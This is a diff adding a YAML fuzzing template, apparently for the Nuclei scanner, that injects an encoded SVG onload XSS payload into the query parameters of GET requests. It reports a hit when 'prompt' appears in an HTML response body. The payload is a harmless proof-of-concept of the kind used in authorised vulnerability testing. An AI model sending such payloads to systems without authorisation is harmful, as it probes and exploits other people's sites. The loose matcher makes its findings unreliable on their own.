@@ -1,0 +1,39 @@
+id: fuzz-reflection-xss-prompt
+
+info:
+  name: Custom Reflection XSS with Prompt Detection
+  author: netbaan
+  severity: low
+  description: |
+    This template is designed to detect reflection XSS vulnerabilities using a specified SVG payload that triggers a prompt with the document domain.
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'  # Run only on GET requests
+
+    payloads:
+      reflection:
+        - "<svg onload=prompt%26%230000000040document.domain)>"
+
+    stop-at-first-match: true
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "prompt"  # Check if 'prompt' appears in the response body
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
